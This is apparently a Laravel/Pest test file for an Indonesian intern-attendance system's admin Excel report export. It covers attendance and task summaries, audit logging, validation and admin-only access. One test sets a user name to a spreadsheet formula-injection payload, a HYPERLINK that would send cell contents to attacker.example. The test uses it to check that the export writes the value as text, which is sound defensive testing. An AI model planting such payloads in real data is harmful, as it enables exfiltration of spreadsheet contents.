<?php

use App\Enums\TaskStatus;
use App\Models\Attendance;
use App\Models\AuditLog;
use App\Models\LeaveRequest;
use App\Models\Task;
use App\Models\User;
use App\Models\WorkHourSetting;
use Illuminate\Support\Carbon;
use Illuminate\Testing\TestResponse;
use OpenSpout\Reader\XLSX\Reader;

// Senin, 12 Oktober 2026 pukul 10:00.
beforeEach(function () {
    $this->travelTo(Carbon::parse('2026-10-12 10:00:00'));

    $this->admin = User::factory()->admin()->create(['name' => 'Admin Sinta']);
    $this->sari = User::factory()->mentor()->create(['name' => 'Sari Wijaya']);
    $this->budiMentor = User::factory()->mentor()->create(['name' => 'Budi Santoso']);
    $this->rina = reportIntern($this->sari, 'Rina Wulandari');
});

function reportIntern(User $mentor, string $name, array $profile = [], array $attributes = []): User
{
    return User::factory()->intern([
        'mentor_id' => $mentor->id,
        'start_date' => '2026-09-01',
        'end_date' => '2026-12-31',
        ...$profile,
    ])->create(['name' => $name, ...$attributes]);
}

function exportReport(User $user, array $data): TestResponse
{
    app('auth')->forgetGuards();

    return test()->postJson('/api/admin/reports/export', $data, ['Authorization' => 'Bearer '.$user->createToken('api')->plainTextToken]);
}

/**
 * Isi sheet pertama file .xlsx dari respons unduhan, baris kosong dilewati.
 *
 * @return list<list<mixed>>
 */
function xlsxRows(TestResponse $response): array
{
    $reader = new Reader;
    $reader->open($response->baseResponse->getFile()->getPathname());
    $rows = [];

    foreach ($reader->getSheetIterator() as $sheet) {
        foreach ($sheet->getRowIterator() as $row) {
            $rows[] = $row->toArray();
        }
        break;
    }

    $reader->close();

    return $rows;
}

/**
 * Baris data setelah baris judul kolom yang diawali $firstHeader.
 *
 * @return list<list<mixed>>
 */
function tableRows(array $rows, string $firstHeader): array
{
    $header = array_search($firstHeader, array_column($rows, 0), true);

    return array_slice($rows, $header + 1);
}

describe('rekap absensi', function () {
    it('counts final statuses per intern in the period, with late days', function () {
        WorkHourSetting::factory()->create();
        Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-05', 'clock_in_at' => '07:55:00']);
        Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-06', 'clock_in_at' => '08:15:00']);
        Attendance::factory()->for($this->rina, 'intern')->clockedIn()->create(['date' => '2026-10-07', 'clock_in_at' => '08:30:00']);
        LeaveRequest::factory()->for($this->rina, 'intern')->approved()->create(['start_date' => '2026-10-08', 'end_date' => '2026-10-08']);
        // Hari ini belum dihitung.
        Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-12', 'clock_in_at' => '09:00:00']);

        reportIntern($this->budiMentor, 'Andi Pratama');
        reportIntern($this->sari, 'Sudah Selesai', ['start_date' => '2026-07-01', 'end_date' => '2026-09-30']);
        reportIntern($this->sari, 'Belum Mulai', ['start_date' => '2026-10-12']);

        $response = exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-10-05', 'to' => '2026-10-12', 'mentor_id' => $this->sari->id])
            ->assertOk()
            ->assertDownload('rekap-absensi_2026-10-05_2026-10-12.xlsx');

        expect($response->headers->get('Content-Type'))->toBe('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

        $rows = xlsxRows($response);

        expect(array_column(array_slice($rows, 0, 6), 0))->toBe([
            'InJourney Airports - Intern Management & Attendance System',
            'Rekap Absensi',
            'Periode: 5 Okt 2026 - 12 Okt 2026',
            'Intern: Semua | Mentor: Sari Wijaya',
            'Dibuat: 12 Okt 2026 10:00 oleh Admin Sinta',
            'Hari ini belum dihitung karena status final ditetapkan setelah 23:59.',
        ])->and(tableRows($rows, 'Intern'))->toBe([
            ['Rina Wulandari', 'Sari Wijaya', 2, 1, 1, 1, 2, 5],
        ]);

        expect(AuditLog::sole()->only(['action', 'object', 'detail']))->toBe([
            'action' => 'Laporan',
            'object' => 'Rekap Absensi',
            'detail' => 'Export Excel 5 Okt 2026 - 12 Okt 2026, mentor Sari Wijaya.',
        ]);
    });

    it('filters by intern and leaves out interns without working days in the period', function () {
        $andi = reportIntern($this->budiMentor, 'Andi Pratama');

        $rows = xlsxRows(exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-10-01', 'to' => '2026-10-09', 'intern_id' => $andi->id])->assertOk());

        expect(tableRows($rows, 'Intern'))->toBe([['Andi Pratama', 'Budi Santoso', 0, 0, 7, 0, 0, 7]]);
    });

    it('tells the admin when there is no data', function () {
        exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-08-01', 'to' => '2026-08-31'])
            ->assertUnprocessable()
            ->assertJsonPath('reason', 'no_data')
            ->assertJsonPath('message', 'Tidak ada data pada periode ini.');

        expect(AuditLog::query()->count())->toBe(0);
    });
});

describe('rekap task', function () {
    it('lists tasks due in the period by the task mentor, marking late submissions', function () {
        $task = fn (array $attributes) => Task::factory()->for($this->rina, 'intern')->create(['mentor_id' => $this->sari->id, ...$attributes]);

        $task(['code' => 'TSK-1', 'title' => 'Desain ERD', 'status' => TaskStatus::Done, 'due_at' => '2026-10-05 17:00:00', 'submitted_at' => '2026-10-06 09:00:00', 'done_at' => '2026-10-06 10:00:00']);
        $task(['code' => 'TSK-2', 'title' => 'Laporan API', 'status' => TaskStatus::InReview, 'due_at' => '2026-10-08 17:00:00', 'submitted_at' => '2026-10-04 09:00:00']);
        $task(['code' => 'TSK-3', 'title' => 'Uji login', 'status' => TaskStatus::Todo, 'due_at' => '2026-10-09 17:00:00']);
        $task(['code' => 'TSK-4', 'title' => 'Dokumen', 'status' => TaskStatus::InProgress, 'due_at' => '2026-10-20 17:00:00']);
        $task(['code' => 'TSK-5', 'title' => 'Bulan depan', 'due_at' => '2026-11-02 17:00:00']);
        // Task yang dibimbing mentor lain (misalnya sebelum ganti mentor) tidak ikut filter Sari.
        $task(['code' => 'TSK-6', 'title' => 'Mentor lama', 'mentor_id' => $this->budiMentor->id, 'due_at' => '2026-10-07 17:00:00']);

        $response = exportReport($this->admin, ['type' => 'tasks', 'from' => '2026-10-01', 'to' => '2026-10-31', 'mentor_id' => $this->sari->id])
            ->assertOk()
            ->assertDownload('rekap-task_2026-10-01_2026-10-31.xlsx');

        expect(tableRows(xlsxRows($response), 'Kode'))->toBe([
            ['TSK-1', 'Rina Wulandari', 'Sari Wijaya', 'Desain ERD', '2026-10-05 17:00', 'Done', '2026-10-06 09:00', 'Terlambat'],
            ['TSK-2', 'Rina Wulandari', 'Sari Wijaya', 'Laporan API', '2026-10-08 17:00', 'In Review', '2026-10-04 09:00', '-'],
            ['TSK-3', 'Rina Wulandari', 'Sari Wijaya', 'Uji login', '2026-10-09 17:00', 'To Do', '-', 'Terlambat'],
            ['TSK-4', 'Rina Wulandari', 'Sari Wijaya', 'Dokumen', '2026-10-20 17:00', 'In Progress', '-', '-'],
        ]);

        expect(AuditLog::sole()->only(['object', 'detail']))->toBe([
            'object' => 'Rekap Task',
            'detail' => 'Export Excel 1 Okt 2026 - 31 Okt 2026, mentor Sari Wijaya.',
        ]);
    });

    it('leaves out tasks of deleted interns', function () {
        $gone = reportIntern($this->sari, 'Sudah Dihapus');
        Task::factory()->for($gone, 'intern')->create(['due_at' => '2026-10-05 17:00:00']);
        $gone->delete();

        exportReport($this->admin, ['type' => 'tasks', 'from' => '2026-10-01', 'to' => '2026-10-31'])
            ->assertJsonPath('reason', 'no_data');
    });
});

it('writes names and task titles as text, never as spreadsheet formulas', function () {
    $payload = '=HYPERLINK("https://attacker.example/?d="&A9,"Rina Wulandari")';
    $this->rina->update(['name' => $payload]);
    Task::factory()->for($this->rina, 'intern')->create(['mentor_id' => $this->sari->id, 'title' => '=1+1', 'due_at' => '2026-10-05 17:00:00']);

    foreach (['attendance', 'tasks'] as $type) {
        $response = exportReport($this->admin, ['type' => $type, 'from' => '2026-10-01', 'to' => '2026-10-09'])->assertOk();

        $zip = new ZipArchive;
        $zip->open($response->baseResponse->getFile()->getPathname());
        $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();

        expect($sheet)->not->toContain('<f>')
            ->and(array_merge(...xlsxRows($response)))->toContain($payload);
    }
});

it('validates the report form', function (array $data, string $field, string $message) {
    exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-10-01', 'to' => '2026-10-09', ...$data])
        ->assertUnprocessable()
        ->assertJsonValidationErrors([$field => $message]);
})->with([
    'tanpa jenis' => [['type' => null], 'type', 'Pilih jenis laporan.'],
    'rekap izin tidak ada' => [['type' => 'leaves'], 'type', 'Pilih jenis laporan.'],
    'periode terbalik' => [['to' => '2026-09-30'], 'to', 'Periode tidak valid.'],
    'bukan intern' => [['intern_id' => 1], 'intern_id', 'Intern tidak ditemukan.'],
]);

it('offers every intern and mentor as filters, including inactive accounts', function () {
    User::factory()->mentor()->inactive()->create(['name' => 'Mentor Lama']);

    app('auth')->forgetGuards();
    test()->getJson('/api/admin/reports/options', ['Authorization' => 'Bearer '.$this->admin->createToken('api')->plainTextToken])
        ->assertOk()
        ->assertJsonPath('data.interns', [['id' => $this->rina->id, 'name' => 'Rina Wulandari']])
        ->assertJsonPath('data.mentors.*.name', ['Budi Santoso', 'Mentor Lama', 'Sari Wijaya'])
        ->assertJsonPath('data.mentors.1.is_active', false);
});

it('lets only admins export', function (string $role) {
    $actor = User::factory()->{$role}()->create();

    exportReport($actor, ['type' => 'attendance', 'from' => '2026-10-01', 'to' => '2026-10-09'])->assertForbidden();
})->with(['intern', 'mentor']);
